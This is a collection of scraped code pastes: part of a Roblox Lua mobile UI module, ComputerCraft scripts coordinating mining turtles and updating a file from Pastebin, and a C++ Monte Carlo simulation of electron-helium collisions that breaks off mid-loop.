            holdThread = task.spawn(function()
                while isHolding do
                    holdCallback()
                    task.wait(0.05)
                end
            end)
        end
    end)
    
    -- Add to draggable buttons list
    table.insert(MobileUI.DraggableButtons, button)
    
    return button
end

-- Create a toggle mobile button
function MobileUI:CreateMobileToggle(name, icon, position, callback)
    local button = Instance.new(""ImageButton"")
    button.Name = name .. ""MobileToggle""
    button.BackgroundColor3 = MobileUI.Config.ButtonColor
    button.BackgroundTransparency = 0.3
    button.Size = UDim2.new(0, 70, 0, 70)
    button.Position = position or UDim2.new(0.9, -35, 0.5, -35)
    button.Image = icon or """"
    button.ImageColor3 = MobileUI.Config.TextColor
    button.Parent = MobileUI.MainFrame
    createCorner(button)
    createShadow(button)
    
    -- Add label
    local label = Instance.new(""TextLabel"")
    label.Name = ""ButtonLabel""
    label.BackgroundTransparency = 1
    label.Position = UDim2.new(0, 0, 0, -25)
    label.Size = UDim2.new(1, 0, 0, 20)
    label.Font = MobileUI.Config.Font
    label.Text = name
    label.TextColor3 = MobileUI.Config.TextColor
    label.TextSize = 12
    label.Parent = button
    
    local indicator = Instance.new(""Frame"")
    indicator.Name = ""ToggleIndicator""
    indicator.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    indicator.Position = UDim2.new(1, -10, 0, 5)
    indicator.Size = UDim2.new(0, 8, 0, 8)
    indicator.Visible = false
    indicator.Parent = button
    createCorner(indicator)
    
    local toggleValue = false
    
    button.MouseButton1Click:Connect(function()
        createRipple(button)
        toggleValue = not toggleValue
        indicator.Visible = toggleValue
        indicator.BackgroundColor3 = toggleValue and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
        
        if callback then callback(toggleValue) end
    end)
    
    -- Add to draggable buttons list
    table.insert(MobileUI.DraggableButtons, button)
    
    return {
        Button = button,
        SetValue = function(value)
            if toggleValue ~= value then
                toggleValue = value
                indicator.Visible = toggleValue
                indicator.BackgroundColor3 = toggleValue and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
                
                if callback then callback(toggleValue) end
            end
        end,
        GetValue = function()
            return toggleValue
        end
    }
end

-- Enable draggable buttons
function MobileUI:EnableDraggableButtons(enabled)
    MobileUI.IsDraggingButtons = enabled
    
    for _, button in ipairs(MobileUI.DraggableButtons) do
        if enabled then
            MobileUI:MakeDraggable(button)
        end
    end
end

-- Show notification
function MobileUI:ShowNotification(title, message, duration)
    local notification = Instance.new(""Frame"")
    notification.Size = UDim2.new(0, 250, 0, 80)
    notification.Position = UDim2.new(0.5, -125, 0, 50 + MobileUI.Config.TopInset)
    notification.BackgroundColor3 = MobileUI.Config.MainColor
    notification.BackgroundTransparency = 0.1
    notification.BorderSizePixel = 0
    notification.Parent = MobileUI.ScreenGui
    createCorner(notification)
    createShadow(notification)
    
    local titleLabel = Instance.new(""TextLabel"")
    titleLabel.Size = UDim2.new(1, -20, 0, 30)
    titleLabel.Position = UDim2.new(0, 10, 0, 5)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = title
    titleLabel.TextColor3 = MobileUI.Config.TextColor
    titleLabel.TextSize = 16
    titleLabel.Font = MobileUI.Config.Font
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.Parent = notification
    
    local messageLabel = Instance.new(""TextLabel"")
    messageLabel.Size = UDim2.new(1, -20, 0, 40)
    messageLabel.Position = UDim2.new(0, 10, 0, 35)
    messageLabel.BackgroundTransparency = 1
    messageLabel.Text = message
    messageLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    messageLabel.TextSize = 14
    messageLabel.Font = Enum.Font.Gotham
    messageLabel.TextXAlignment = Enum.TextXAlignment.Left
    messageLabel.TextWrapped = true
    messageLabel.Parent = notification
    
    -- Animation
    notification.Position = UDim2.new(0.5, -125, 0, -100)
    local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local tween = TweenService:Create(notification, tweenInfo, {Position = UDim2.new(0.5, -125, 0, 50 + MobileUI.Config.TopInset)})
    tween:Play()
    
    -- Auto remove
    delay(duration or 3, function()
        local fadeOut = TweenService:Create(notification, TweenInfo.new(0.5), {Position = UDim2.new(0.5, -125, 0, -100)})
        fadeOut:Play()
        fadeOut.Completed:Connect(function()
            notification:Destroy()
        end)
    end)
end

-- Destroy the UI
function MobileUI:Destroy()
    if MobileUI.ScreenGui then
        MobileUI.ScreenGui:Destroy()
        MobileUI.ScreenGui = nil
    end
end

return MobileUI
"
r3YUnjXP,mine_server,DabDaddy6223,Lua,Monday 14th of April 2025 02:36:29 PM CDT,"TURTLES = {}
TURTLE_COUNT = 0

CHEST_X = 0
CHEST_Z = 0

function prepare()
    print(""How many turtles should connect?"")

    TURTLE_COUNT = tonumber(read())
    local currentTurtles = 0
    
    if TURTLE_COUNT ~= nil then
        while currentTurtles < TURTLE_COUNT do
            local turtle_id, message = rednet.receive(""minenettoserver"")
            rednet.send(turtle_id, ""Welcome!"", ""minenettoclient"")

            TURTLES[currentTurtles] = turtle_id

            print(""Turtle #"" .. turtle_id .. "" connected"")
            currentTurtles = currentTurtles + 1
        end

        print(""How many blocks should the turtles go?"")
        local distance = tonumber(read())
        if distance ~= nil then
            for i=0, currentTurtles - 1 do
                rednet.send(TURTLES[i], distance, ""minenettoclient"")
            end

            return true
        else
            return false
        end
    else
        print(""Please enter a valid number"")
        return false
    end
end

function main()
    rednet.open(""right"")
    if rednet.isOpen(""right"") ~= true then
        print(""Failed to start modem!"")
        return
    end

    local successfulTurtles = 0
    if prepare() == true then
        while successfulTurtles < TURTLE_COUNT do
            local id, message = rednet.receive(""minenettoserver"")
            if message == ""returned"" then
                print(""Turtle #"" .. id .. "" has returned to the start"")
                successfulTurtles = successfulTurtles + 1
            elseif message == ""returning"" then
                print(""Turtle #"" .. id .. "" has finished mining and is returning to the start"")
            elseif message == ""out_of_fuel"" then
                print(""Turtle #"" .. id .. "" has ran out of fuel"")
            end
        end
    end

    rednet.close(""right"")
end

main()"
71Dt9x7h,mine_client,DabDaddy6223,Lua,Monday 14th of April 2025 02:36:15 PM CDT,"SERVER_ID = 0

FUEL_COUNT = -1
FUEL_INDEX = -1
ACCEPTABLE_FUEL = {""minecraft:coal""}

BLOCK_COUNT = -1
BLOCK_INDEX = -1
BUILDING_BLOCKS = {""minecraft:cobblestone"", ""minecraft:dirt"", ""minecraft:andesite"", ""minecraft:granite"", ""minecraft:diorite"", ""minecraft:cobbled_deepslate"", ""minecraft:tuff""}

function arrHasValue(arr, val)
    for index, value in ipairs(arr) do
        if value == val then
            return true
        end
    end

    return false
end

function hasFuel()
    if FUEL_INDEX == -1 then
        for i=1, 16 do
            turtle.select(i)
            
            local slotData = turtle.getItemDetail()

            if slotData ~= nil then
                if arrHasValue(ACCEPTABLE_FUEL, slotData[""name""]) == true then
                    FUEL_INDEX = i
                    FUEL_COUNT = slotData[""count""]
                    break
                end
            end
        end
    end

    return FUEL_COUNT > 0
end

function shouldRefuel()
    return turtle.getFuelLevel() <= 0
end

function refuel()
    turtle.select(FUEL_INDEX)
    turtle.refuel(1)
    FUEL_COUNT = FUEL_COUNT - 1
end

function getBlockIndex()
    if BLOCK_COUNT == 0 then
        BLOCK_INDEX = -1
    end

    if BLOCK_INDEX == -1 then
        for i=1, 16 do
            turtle.select(i)
            
            local slotData = turtle.getItemDetail()

            if slotData ~= nil then
                if arrHasValue(BUILDING_BLOCKS, slotData[""name""]) == true then
                    BLOCK_INDEX = i
                    BLOCK_COUNT = slotData[""count""]
                    break
                end
            end
        end
    end

    return BLOCK_INDEX
end

function dumpDown()
    for i=1, 16 do
        turtle.select(i)
        local slotData = turtle.getItemDetail()

        if slotData ~= nil then
            if arrHasValue(ACCEPTABLE_FUEL, slotData[""name""]) == false then
                turtle.dropDown(slotData[""count""])
            end
        end
    end
end

-- +x -> east
-- -x -> west
-- -z -> north
-- +z -> south
function getFacingDirection(x, z, prevX, prevZ)
    if x < prevX then
        return ""west""
    elseif x > prevX then
        return ""east""
    end

    if z < prevZ then
        return ""north""
    elseif z > prevZ then
        return ""south""
    end
end

-- +x -> east = 0
-- -z -> north = 1
-- -x -> west = 2
-- +z -> south = 3
function rotateToFace(currentFacing, target)
    local turning = {
        east = 0,
        north = 1,
        west = 2,
        south = 3
    }
    
    if currentFacing == target then
        return
    end

    local currFacingVal = turning[currentFacing]
    local targFacingVal = turning[target]
    local offset = targFacingVal - currFacingVal

    if offset < 0 then
        offset = offset + 3
    end

    local moveFacing = currentFacing
    for i=0, offset do
        moveFacing = left(moveFacing)
    end
end

-- +x -> east
-- -x -> west
-- -z -> north
-- +z -> south
function incrementByFacing(facing, x, z, increment)
    if facing == ""west"" then
        return (x - increment), z
    elseif facing == ""east"" then
        return (x + increment), z
    elseif facing == ""north"" then
        return x, (z - increment)
    elseif facing == ""south"" then
        return x, (z + increment)
    end
end

function left(facing)
    turtle.turnLeft()
    if facing == ""west"" then
        return ""south""
    elseif facing == ""east"" then
        return ""north""
    elseif facing == ""north"" then
        return ""west""
    elseif facing == ""south"" then
        return ""east""
    end
end

function right(facing)
    turtle.turnRight()
    if facing == ""west"" then
        return ""north""
    elseif facing == ""east"" then
        return ""south""
    elseif facing == ""north"" then
        return ""east""
    elseif facing == ""south"" then
        return ""west""
    end
end

function moveToward(x, z, facing)
    local currX, currY, currZ = gps.locate()

    -- Change facing direction if we need to
    local newFacing = facing
    if currX < x then
        rotateToFace(facing, ""east"")
        newFacing = ""east""
    elseif currX > x then
        rotateToFace(facing, ""west"")
        newFacing = ""west""
    else
        if currZ < z then
            rotateToFace(facing, ""south"")
            newFacing = ""south""
        elseif currZ > z then
            rotateToFace(facing, ""north"")
            newFacing = ""north""
        end
    end

    -- Dig the block in front
    if turtle.detect() == true then
        turtle.dig()
    end

    -- Move forward
    turtle.forward()

    -- If there is no block below, place one if possible
    if turtle.detectDown() == false then
        local blockIndex = getBlockIndex()
        if blockIndex ~= -1 then
            turtle.select(blockIndex)
            turtle.placeDown()
        end
    end

    -- Dig the block above
    if turtle.detectUp() == true then
        turtle.digUp()
    end

    return newFacing
end

function moveBackTo(x, z, facing)
    local currX, currY, currZ = gps.locate()

    local newFacing = facing
    if currZ < z then
        rotateToFace(facing, ""south"")
        newFacing = ""south""
    elseif currZ > z then
        rotateToFace(facing, ""north"")
        newFacing = ""north""
    else
        if currX < x then
            rotateToFace(facing, ""east"")
            newFacing = ""east""
        elseif currX > x then
            rotateToFace(facing, ""west"")
            newFacing = ""west""
        end
    end

    local success = turtle.forward()
    if success == false then
        return """"
    end

    -- Pick up any blocks that may have dropped on the ground (e.g. gravel)
    turtle.suck()

    return newFacing
end

function reachedTarget(x, z, targetX, targetZ)
    return x == targetX and z == targetZ
end

function loop(targetX, targetZ, facing)
    if shouldRefuel() == true then
        if hasFuel() == true then
            refuel()
        else
            print(""Not enough fuel!"")
            rednet.send(SERVER_ID, ""out_of_fuel"", ""minenettoserver"")
            return """"
        end
    end

    return moveToward(targetX, targetZ, facing)
end

function returnTo(targetX, targetZ, facing)
    if shouldRefuel() == true then
        if hasFuel() == true then
            refuel()
        else
            print(""Not enough fuel!"")
            rednet.send(SERVER_ID, ""out_of_fuel"", ""minenettoserver"")
            return """"
        end
    end

    return moveBackTo(targetX, targetZ, facing)
end

function prepare()
    print(""Connecting..."")
    rednet.broadcast(""turtle"", ""minenettoserver"")

    local id, message = rednet.receive(""minenettoclient"")
    SERVER_ID = id

    print(""Connected!"")

    local id, distance = rednet.receive(""minenettoclient"")

    if shouldRefuel() == true then
        if hasFuel() == true then
            refuel()
        else
            print(""Not enough fuel!"")
            rednet.send(SERVER_ID, ""out_of_fuel"", ""minenettoserver"")
            return nil
        end
    end

    return distance
end

function main()
    rednet.open(""left"")
    if rednet.isOpen(""left"") ~= true then
        print(""Failed to start modem!"")
        return
    end

    local distance = prepare()

    if distance ~= nil then
        local currentX, currentY, currentZ = gps.locate()
        local startX, startZ = currentX, currentZ
        
        if turtle.detect() == true then
            turtle.dig()
        end
        
        turtle.forward()
        local nextX, nextY, nextZ = gps.locate()
        turtle.back()
        
        if turtle.detectUp() == true then
            turtle.digUp()
        end

        local facing = getFacingDirection(nextX, nextZ, currentX, currentZ)
        local targetX, targetZ = incrementByFacing(facing, currentX, currentZ, distance)

        print(""Heading to target: "" .. targetX .. "", "" .. targetZ)

        while reachedTarget(currentX, currentZ, targetX, targetZ) ~= true do
            facing = loop(targetX, targetZ, facing)
            currentX, currentY, currentZ = gps.locate()

            if facing == """" then
                break
            end
        end

        rednet.send(SERVER_ID, ""returning"", ""minenettoserver"")

        while reachedTarget(currentX, currentZ, startX, startZ) ~= true do
            facing = returnTo(startX, startZ, facing)
            currentX, currentY, currentZ = gps.locate()

            if facing == """" then
                break
            end
        end

        rednet.send(SERVER_ID, ""returned"", ""minenettoserver"")
        
        while reachedTarget(currentX, currentZ, startX, startZ) ~= true do
            facing = returnTo(startX, startZ, facing)
            currentX, currentY, currentZ = gps.locate()
        
            if facing == """" then
                break
            end
        end
        
        dumpDown()
        left(facing)
        left(facing)
        rednet.send(SERVER_ID, ""dumped"", ""minenettoserver"")
    end

    rednet.close(""left"")
end

main()"
ehUaXMmv,update,DabDaddy6223,Lua,Monday 14th of April 2025 02:33:17 PM CDT,"PASTE_ID = """"
FILE_NAME = """"

function main()
    if fs.exists(FILE_NAME) == true then
        fs.delete(FILE_NAME)
    end

    shell.execute(""pastebin"", ""get"", PASTE_ID, FILE_NAME)
end

main()"
0pGMSKy2,superelastic+field_heating(v2),phystota,C++,Monday 14th of April 2025 02:28:59 PM CDT,"#include <iostream>
#include <random>
#include <fstream>
#include <assert.h>

#include <math.h>
#include <time.h>
#include <iomanip>  // For std::fixed and std::setprecision

#include <algorithm>  // For std::shuffle
#include <numeric>    // For std::iota

//physical constants

#define m_e 9.1E-31 // electron mass in kg
#define M_n 6.6464731E-27 // Helium atom mass
#define k_b 1.38E-23 // Boltzmann constant
#define q 1.602176634E-19 // elementary charge    - eV -> J transfer param
#define Coulomb_log 10.0 // Coulomb logarithm
#define epsilon_0 8.854188E-12 // Vacuum permittivity
#define Coulomb_const pow(q,4)/(pow(4.0*M_PI*epsilon_0,2)) // e^4/(4*pi*eps0)^2
#define thresh1 19.82 // threshold energy excitation tripet state
#define thresh2 20.51 // threshold energy excitation singlet state

// simulation parameters

#define n_e 500000
#define N_He 10000000000 // Helium neutrals number
#define T_n 10.0 // Helium neutral temperature in eV
#define T_e 100.0    // electron Maxwell initial distribution
#define Emin 0.0
#define Emax 2000.0
#define Volume 1.0E-12 // Volume to csssssssssssssssssalculate netral density and collision frequency 
#define time 1.0E-6 // 500 microsec time to equalibrate the system
#define dopant 1.0E-12 // addition to avoid zero
#define E_reduced 0.0 // constant electrin field along z-axis

#define bin_width 0.1 // keep energy step ~ this to maintain cross-section clarity (Ramsauer minimum etc)
#define N ( (int)((Emax-Emin)/bin_width) + 1) // add 1 to include E_max if needed?

// handling final energy bin

#define bin_width_smooth 0.5 // energy bin for smooth final distribution
#define N_smooth ( (int)((Emax-Emin)/bin_width_smooth) )



double solve_A(double s) { // Netwon method solver

    if (s > 3) {
        return 3*exp(-s);
    }
    if (s < 0.01) {
        return 1.0/s;
    }
    
    double A0 = 0.01; // initial guess
    double A = A0;  //starting with initial guess
    double tol = 1.0E-7; // accuracy

             
    for (int i = 0; i < 1000; i++){

        double tanhA = tanh(A);
        // Avoid division by an extremely small tanh(A)
        if (fabs(tanhA) < 1e-12) {
            std::cerr << ""tanh(A) too small, returning fallback at iteration "" << i << ""\n"";
            return 1.0E-7;
        }        

        double f = 1.0 / tanhA - 1.0 / A - exp(-s);
        if (fabs(f) < tol)
            break;

        double sinhA = sinh(A);
        if (fabs(sinhA) < 1e-12) {
            std::cerr << ""sinh(A) too small, returning fallback at iteration "" << i << ""\n"";
            return 1.0E-5;
        }

        double dfdA = -1.0/(sinh(A)*sinh(A)) + 1.0/(A*A);

        // Check if derivative is too close to zero to avoid huge updates
        if (fabs(dfdA) < 1e-12) {
            std::cerr << ""dfdA is too small at iteration "" << i << "", returning fallback\n"";
            if (s < 0.01) {
//                std::cout << ""Small s! Huge A!"" << ""\n"";
                return 1.0/s;
            }
            if (s > 3) {
                return 3.0*exp(-s);
            }
        }        

        A -= f/dfdA;

        // Early check for numerical issues
        if (std::isnan(A) || std::isinf(A)) {
            std::cerr << ""Numerical error detected, invalid A at iteration "" << i << ""\n"";
            return (A > 0) ? 1.0E-5 : -1.0E-5;  // Fallback value based on sign
        }        


    }

    return A;
}

struct Electron {

    //velocity components
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;
    //energy in eV
    double energy = 0.0;
    //Collision flag
    bool collided_en = false;
    bool collided_ee = false;

    // initializing Maxwell-Boltzmann distribution with T_e
    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis, std::gamma_distribution<double>& maxwell) {

        double R = dis(gen);

        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 

            
        energy = maxwell(gen); // neutrals energies sampled as Maxwell distribution in eV
            
        double speed = sqrt(2*energy*q/m_e);

        //velocity components of neutrals in m/s
        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }


};

struct CrossSection {
    double energy;
    double sigma;
};

double interpolate (double energy, const std::vector<CrossSection>& CS) {


    if (energy < CS.front().energy) {
//        std::cout << "" required energy value lower than range of cross-section data at energy: "" << energy << ""\n"";
        return 0.0;
    }
    if (energy > CS.back().energy) {
//        std::cout << "" required energy value higher than range of cross-section data"" << ""\n"";
        return 0.0;        
    }

    int step = 0;   
        while (step < CS.size() && energy > CS[step].energy) {
            step++;
        }

    double k = (CS[step].sigma - CS[step-1].sigma)/(CS[step].energy - CS[step-1].energy);
    double m = CS[step].sigma - k*CS[step].energy;
    
    return k*energy + m; 
}


struct NeutralParticle {

    double energy = 0.0;
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;

    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis, std::gamma_distribution<double>& maxwell) {

        double R = dis(gen);

        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 

            
        energy = maxwell(gen); // neutrals energies sampled as Maxwell distribution in eV
            
        double speed = sqrt(2*energy*q/M_n);

        //velocity components of neutrals in m/s
        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }
    
};

struct Excited_neutral {

    double energy;
    double vx;
    double vy;
    double vz;
    
};



int main() {

    clock_t start = clock();

    std::vector<Electron> electrons(n_e); // better to use vector instead of simple array as it's dynamically allocated (beneficial for ionization)
//    std::vector<NeutralParticle> neutrals(N_He); // I don't need a vector of neutrals bcs it's like a backhround in MCC-simulation
    std::vector<Excited_neutral> exc_1;  // vector to track triplet excited atoms of Helium
    std::vector<Excited_neutral> exc_2;  // vector to track singlet excited atoms of Helium

    std::vector<int> histo_random(N, 0); // initialize N size zero-vector for random (initial) histogram
    std::vector<int> histo_maxwell(N, 0); // initialize N size zero-vector for maxwellian histogram
    std::vector<int> histo_neutral(N, 0); // initialize N size zero-vector for neutral distribution histogram
    std::vector<int> histo_excited(N, 0); // initialize N size zero-vector for excited He distribution histogram

    std::vector<double> elastic_vec(N, 0); // precompiled elastic cross-section-energy vector
    std::vector<double> inelastic1_vec(N, 0); // precompiled inelastic(triplet excitation) cross-section-energy vector
    std::vector<double> inelastic2_vec(N, 0); // precompiled inelastic(singlet excitation) cross-section-energy vector    
    std::vector<double> superelastic1_vec(N, 0); // precompiled superelastic(triplet de-excitation) cross-section-energy vector
    std::vector<double> superelastic2_vec(N, 0); // precompiled superelastic(triplet de-excitation) cross-section-energy vector

    std::random_device rd; 
    std::mt19937 gen(rd());
    std::uniform_real_distribution<double> dis(0.0, 1.0);
    std::gamma_distribution<double> maxwell_neutral(1.5, T_n);
    std::gamma_distribution<double> maxwell_electron(1.5, T_e);

    std::ifstream elastic_cs_dat(""cross_sections/elastic.dat"");
    if (!elastic_cs_dat.is_open()) {
        std::cerr << ""Error opening elastic cross-sections file!"" << std::endl;
        return 1;
    }    

    std::ifstream excitation1_cs_dat(""cross_sections/inelastic_triplet.dat"");
    if (!excitation1_cs_dat.is_open()) {
        std::cerr << ""Error opening inelastic triplet cross-sections file!"" << std::endl;
        return 1;
    }

    std::ifstream excitation2_cs_dat(""cross_sections/inelastic_singlet.dat"");
    if (!excitation2_cs_dat.is_open()) {
        std::cerr << ""Error opening inelastic singlet cross-sections file!"" << std::endl;
        return 1;
    }

    // --- starts reading cross section datafiles

//-----------------elastic---------------------------//
    std::vector<CrossSection> elastic_CS_temp;

    double energy, sigma;

    while (elastic_cs_dat >> energy >> sigma) {
        elastic_CS_temp.push_back({energy, sigma});
    }    
    elastic_cs_dat.close();

    energy = 0.0;
    sigma = 0.0;
//-----------------triplet excitation---------------------------//
    std::vector<CrossSection> inelastic1_CS_temp;

    while (excitation1_cs_dat >> energy >> sigma) {
        inelastic1_CS_temp.push_back({energy, sigma});
    }    
    excitation1_cs_dat.close();    
//-----------------singlet excitation---------------------------//
    energy = 0.0;
    sigma = 0.0;

    std::vector<CrossSection> inelastic2_CS_temp;

    while (excitation2_cs_dat >> energy >> sigma) {
        inelastic2_CS_temp.push_back({energy, sigma});
    }    
    excitation2_cs_dat.close();    

    // --- finish reading cross-section datafiles  

    std::ofstream file0(""output_files/velocities.dat"");    
    std::ofstream file1(""output_files/energies.dat"");        
    std::ofstream file2(""output_files/energies_final.dat"");    
    std::ofstream file3(""output_files/histo_random.dat"");    
    file3 << std::fixed << std::setprecision(10);
    
    std::ofstream file4(""output_files/histo_maxwell.dat"");
    file4 << std::fixed << std::setprecision(10);           
    
    std::ofstream file5(""output_files/neutral_distribution.dat"");    
    std::ofstream file6(""output_files/E*f(E).dat"");    
    std::ofstream file7(""output_files/nu_max.dat"");
    std::ofstream file8(""output_files/electron_mean_energy.dat"");
    std::ofstream file9(""output_files/nu_elastic_average_initial.dat"");
    std::ofstream file10(""output_files/nu_inelastic1_average_initial.dat"");
    std::ofstream file11(""output_files/nu_elastic_average_final.dat"");
    std::ofstream file12(""output_files/nu_inelastic1_average_final.dat""); 
    std::ofstream file13(""output_files/log_output.dat"");  
    std::ofstream file14(""output_files/excited_energies.dat"");       
    std::ofstream file15(""output_files/excited_histo.dat"");             
    std::ofstream file_temp(""output_files/temp.dat"");  

    // Initialize all electrons
    for (auto& e : electrons) {
        e.initialize(gen, dis, maxwell_electron);
    }

    // precalculate cross-sections for each energy bin
    for (int i = 0; i < N; i++){
        elastic_vec[i] = interpolate(bin_width*(i+0.5), elastic_CS_temp); //elastiuc
        inelastic1_vec[i] = interpolate(bin_width*(i+0.5), inelastic1_CS_temp); //triplet excitation
        inelastic2_vec[i] = interpolate(bin_width*(i+0.5), inelastic2_CS_temp); //singlet excitation
    }

    for (int i = 0; i < N; i++) {
        double bin_center = Emin + (i + 0.5) * bin_width;
        file_temp << bin_center << "" "" << inelastic2_vec[i] << ""\n"";
    }

    // precalculate superelastic cross-section (triplet -> ground) for each energy bin
    // detailed balance gives: sigma_j_i(E) = (g_i/g_j)*((E+theshold)/E)*sigma_i_j(E+theshold)
    for (int i = 0; i < N; i++){
        double energy = Emin + (i + 0.5) * bin_width;
        int thresh_bin = (int)( (thresh1 - Emin)/bin_width ); // calculating bin for threshold energy
        superelastic1_vec[i] = (1.0/3.0)*((energy + thresh1)/energy)*interpolate(energy + thresh1, inelastic1_CS_temp); // using detailed balance, calculating backward deexcitation cross-section
        superelastic2_vec[i] = (1.0/1.0)*((energy + thresh2)/energy)*interpolate(energy + thresh2, inelastic2_CS_temp);
    }

    for (int i = 0; i < n_e; i++){
        file1 << i << "" "" << electrons.at(i).energy << ""\n"";
        file0 << i << "" "" << electrons[i].vx << "" "" << electrons[i].vy << "" "" << electrons[i].vz << ""\n""; 
    }

    // -----initial electrons energy distribution starts------------////
    for (int i = 0; i < n_e; i++){
        int bin = (int)( (electrons[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_random.size())
            histo_random[bin]++;
    }

    for (int i = 0; i < histo_random.size(); i++){
        double bin_center = Emin + (i + 0.5) * bin_width;
        file3 << bin_center << "" "" <<  static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n""; // this is electron normalized distribution function
    }
    // -----initial electrons energy distribution ends------------////    

    // // -----neutrals Maxwell-Boltzmann distribution starts------------////
    // for (int i = 0; i < N_He; i++){
    //     int bin = (int)( (neutrals[i].energy - Emin)/bin_width );
    //     if (bin >=0 && bin < histo_neutral.size())
    //         histo_neutral[bin]++;
    // }    

    // for (int i = 0; i < histo_neutral.size(); i++){
    //     double bin_center = Emin + (i + 0.5) * bin_width;
    //     file5 << bin_center << "" "" << static_cast<double>(histo_neutral[i])/(neutrals.size()*bin_width) << ""\n""; // this is real f(E) - normalized distribution
    //     file6 << bin_center << "" "" << bin_center*static_cast<double>(histo_neutral[i])/(neutrals.size()*bin_width) << ""\n""; // this should be E*f(E) 

    // }
    // // -----neutrals Maxwell-Boltzmann distribution starts------------////       

    // // ---- precalculating A from eq.13 nanbu1997 ------ ///

    // double ds = 0.001;
    // double s_min = 0.01;
    // double s_max = 3.0;
    // int A_size = static_cast<int>((s_max - s_min)/ds);

    // std::vector<double> A_vec(A_size);

    // for (int i = 0; i < A_size; i++){
    //     double s = s_min + i*ds;
    //     A_vec[i] = solve_A(s);
    //     file_temp << s << "" "" << A_vec[i] << ""\n"";
    // }
    
    // // ---- end A precalculation -------------------------//

    // -----calculating nu-max for null-collision method starts ------------////
    double nu_max = 0.0;
    double nu_max_temp = 0.0;
    double sigma_total = 0.0;
    
    for (int i = 0; i < N; i++){
        sigma_total = elastic_vec[i] + inelastic1_vec[i] + superelastic1_vec[i] + inelastic2_vec[i] +  superelastic2_vec[i];
        nu_max_temp = (N_He/Volume)*sigma_total * sqrt(2.0*(i*bin_width + bin_width/2.0)*q/m_e);
        file7 << i << "" "" << nu_max_temp << ""\n"";
        if (nu_max_temp > nu_max)
            nu_max = nu_max_temp;
    }
    // -----calculating nu-max for null-collision method ends ------------////

    //----- calculating number to calculate nu-average (both elastic/inelastic )from our electron distribution starts---------///
    // --- calculating nu(E)*f(E) for later external integration, using initial f(E)
    for (int i = 0; i < N; i++){
        double bin_center = Emin + (i + 0.5) * bin_width;
        file9 << bin_center << "" "" << (N_He/Volume)*elastic_vec[i] * sqrt(2.0*bin_center*q/m_e)*static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n"";
        file10 << bin_center << "" "" << (N_He/Volume)*inelastic1_vec[i] * sqrt(2.0*bin_center*q/m_e)*static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n"";
    }
    //----- calculating nu-average from our electron distribution ends ---------///    

    double dt = 0.01/nu_max;   // minimum should be 0.1/nu_max to get acceptable numerical error range see Vahedi Surrendra 1995
    double steps = static_cast<int>(time/dt);

    std::cout << steps << ""\n"";

    //using  null-collision technique, getting the number of particles colliding each step: P_collision = 1 - exp(-nu_max*dt)
    int Ne_collided = (1.0-exp(-1.0*dt*nu_max))*n_e;


    int print_interval = 1000;
    int el_coll_counter = 0; // track all elastic collisions
    int exc1_coll_counter = 0; // track all triplet excitation collisions
    int exc2_coll_counter = 0; // track all singlet excitation collisions
    int null_coll_counter = 0; // track null-collisions
    int ee_coll_counter = 0; //track e-e Coulomb collisions
    int super1_coll_counter = 0; // track superelastic triplet collisions
    int super2_coll_counter = 0; // track superelastic triplet collisions    

    for (int t = 0; t < steps; t++){

        // Generate shuffled list of electron indices
        int reshuffle_interval = 1;
        std::vector<int> electron_indices(n_e);
        std::iota(electron_indices.begin(), electron_indices.end(), 0); // fill with index
        std::shuffle(electron_indices.begin(), electron_indices.end(), gen); // shuffle the indexes    

        // Generate shuffled list of triplet excited atoms indices
        std::vector<int> excited1_indices(exc_1.size());
        std::iota(excited1_indices.begin(), excited1_indices.end(), 0); // fill with index
        std::shuffle(excited1_indices.begin(), excited1_indices.end(), gen); // shuffle the indexes    

        // Generate shuffled list of singlet excited atoms indices
        std::vector<int> excited2_indices(exc_2.size());
        std::iota(excited2_indices.begin(), excited2_indices.end(), 0); // fill with index
        std::shuffle(excited2_indices.begin(), excited2_indices.end(), gen); // shuffle the indexes    

        int exc1_coll_counter_temp = 0;
        int super1_coll_counter_temp = 0;
        int exc2_coll_counter_temp = 0;
        int super2_coll_counter_temp = 0;

        std::cout << ""timestep remains: "" << steps - t << ""\n"";

        // calculating mean energy 
        double total_energy = 0.0;
        for (const auto& e : electrons) total_energy += e.energy;
        double mean_energy = total_energy / n_e;
        file8 << t*dt << "" "" << mean_energy << ""\n"";            


        // setting flags to false each timestep
        for (auto& e : electrons) e.collided_en = false;
        for (auto& e : electrons) e.collided_ee = false;        

        int collision_counter_en = 0; // electron-neutral collision counter
        int collision_counter_ee = 0; // e-e collisoin counter


        for (int idx : electron_indices) {

            if (collision_counter_en >= Ne_collided) break; // quit if reached all collisions

            Electron& e = electrons[idx];
            if (e.collided_en) continue;  // Skip already collided electrons

            double electron_energy = e.energy;
            int bin_energy = static_cast<int>(electron_energy / bin_width);
            double nu_elastic = (N_He/Volume) * elastic_vec[bin_energy] * sqrt(2.0*electron_energy*q/m_e);
            double nu_inelastic1 = (N_He/Volume) * inelastic1_vec[bin_energy] * sqrt(2.0*electron_energy*q/m_e);
            double nu_superelastic1 = (exc_1.size()/Volume) * superelastic1_vec[bin_energy] * sqrt(2.0*electron_energy*q/m_e);
